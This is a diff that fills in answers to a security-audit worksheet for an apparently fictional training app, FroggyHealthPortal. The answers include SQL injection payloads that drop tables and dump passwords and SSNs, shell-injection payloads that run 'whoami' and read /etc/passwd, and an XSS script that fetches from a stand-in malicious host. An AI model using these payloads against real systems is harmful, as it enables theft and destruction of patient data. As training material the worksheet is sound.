@@ -1,6 +1,6 @@
 # FroggyHealthPortal Security Audit
-**Consultant:**
-**Date:**
+**Consultant: Eric Norman**
+**Date: 04/30/2026**
 
 ---
 
@@ -16,11 +16,12 @@ String based SQL Injection. Someone can inject something malicious in the query.
 
 ```
 ' OR '1'='1
+'; DROP TABLE patients; --
 ```
 
 **3. What damage could an attacker do with this vulnerability?**
 
-> _Your answer here._
+Database read/write/delete access. Steal patient records, change patient records, delete patient records.
 
 ---
 
@@ -28,21 +29,22 @@ String based SQL Injection. Someone can inject something malicious in the query.
 
 **1. What type of injection vulnerability exists here?**
 
-> _Your answer here._
+An OS Command Injection. Someone can inject something malicious in the cmd. 
 
 **2. Example attack payload:**
 
 ```
-Your payload here
+/report/123; whoami
+/report/123 && cat /etc/passwd
 ```
 
 **3. What could an attacker do with this vulnerability?**
 
-> _Your answer here._
+Remote Code Execution. Read/write/delete any file. Attack the internal server.
 
 **4. Why are shell commands with user input dangerous?**
 
-> _Your answer here._
+Becasue the command accepts ";" "&&" "|" as seperators and the user can input whatever they want which allows for RCE.
 
 ---
 
@@ -52,33 +54,35 @@ Your payload here
 
 - **Type of injection:**
 
-  > _Your answer here._
+  SQL Injection
 
 - **Attack payload:**
 
   ```
-  Your payload here
+  /notes/1 UNION SELECT password FROM users--
   ```
 
 - **Impact:**
 
-  > _Your answer here._
+  This payload pulls all passwords, but other patient information can be pulled aswell. Data can also be destroyed or manipulated. 
 
 **Vulnerability 2:**
 
 - **Type of injection:**
 
-  > _Your answer here._
+  Cross Site Scripting (XSS)
 
 - **Attack payload:**
 
   ```
-  Your payload here
+  <script>
+    fetch('maliciouswebsite.com/stealinfo')
+  </script>
   ```
 
 - **Impact:**
 
-  > _Your answer here._
+  Malicious code executes in users browser including session hijacking, keylogging, phishing.
 
 ---
 
@@ -86,18 +90,20 @@ Your payload here
 
 **1. Identify both SQL injection vulnerabilities:**
 
-> _Your answer here._
+WHERE p.patient_id = {patient_id} - Integer expected, but anything can be accepted
+
+AND m.name = '{medication}' - Can be broken by adding a quote ' 
 
 **2. `patient_id` parameter:**
 
 - **Why is it vulnerable even without quotes?**
 
-  > _Your answer here._
+  Python never validates the type without quotes allowing the user to immediately inject malicious code. The user would have to use a closing quote ' otherwise.
 
 - **Attack payload:**
 
   ```
-  Your payload here
+  OR 1=1--
   ```
 
 **3. `medication` parameter:**
@@ -105,12 +111,12 @@ Your payload here
 - **UNION injection to dump all patient data:**
 
   ```
-  Your payload here
+  ' UNION SELECT ssn, name, dob, address, phone, null, null FROM patients--
   ```
 
 - **How does this attack work?**
 
-  > _Your answer here._
+  The single quote breaks the input out of the string and nullinfies the original query. UNION SELECT gets patient date, -- discrards everything after injection.
 
 ---
 
@@ -118,21 +124,24 @@ Your payload here
 
 **1. What injection vulnerability exists here?**
 
-> _Your answer here._
+OS Command Injection with two points of entry at "cmd = f'/usr/bin/mail -s "{subject}" {email}'"
 
 **2. Attack payload that executes arbitrary commands:**
 
 ```
-Your payload here
+victim@email.com; whoami
 ```
 
 **3. Step-by-step explanation of how the attack works:**
 
-> _Your answer here._
+Step 1: Attacker provides payload
+Step 2: Python interprets the string and builds the command with no validation
+Step 3: "shell=True" activates the shell interpreter which parses the string for seperate commands (; && |)
+Step 4: Each seperate command executes sequentially
 
 **4. When should `shell=True` be used in Python subprocess?**
 
-> _Your answer here._
+Only for fully hard coded commands that need shell specific features. NEVER for user input.
 
 ---
 
@@ -144,33 +153,33 @@ Your payload here
 
 - **What's wrong?**
 
-  > _Your answer here._
+  MD5 is the wrong hash function for passwords. It is built for speed, and doesn't have the security a password would need. Two different inputs can produce the same hash. The same password always produces the same hash.
 
 - **What attack does this enable?**
 
-  > _Your answer here._
+  Brute force attack. Attackers can get hashes for common passwords and brute force until they get the right one.
 
 - **How would you fix it?**
 
-  > _Your answer here._
+  Use a more secure password hasher like bcrypt.
 
 **Cryptography Mistake 2:**
 
 - **What's wrong?**
 
-  > _Your answer here._
+  No salting. No random value added to each password before hashing. Without it it's easy to reverse engineer the password.
 
 - **What attack does this enable?**
 
-  > _Your answer here._
+  If an attacker sees multiple users with the same hash, they can infer that they all have the same password. Also, same as before, attackers can more easily brute force a password.
 
 - **How would you fix it?**
 
-  > _Your answer here._
+  Add a salting function. Or just use bcrypt since it does that automatically.
 
 **Does `check_password` have an exploitable timing attack vulnerability?**
 
-> _Your answer here._
+Potentially. In "if password_hash == stored_hash:" Python's == operator does byte by byte comparison that can have timing differences. That means different inputs can take longer or shorter to respond. In some circumstances someone might be able to brute force a password locally.
 
 ---
 
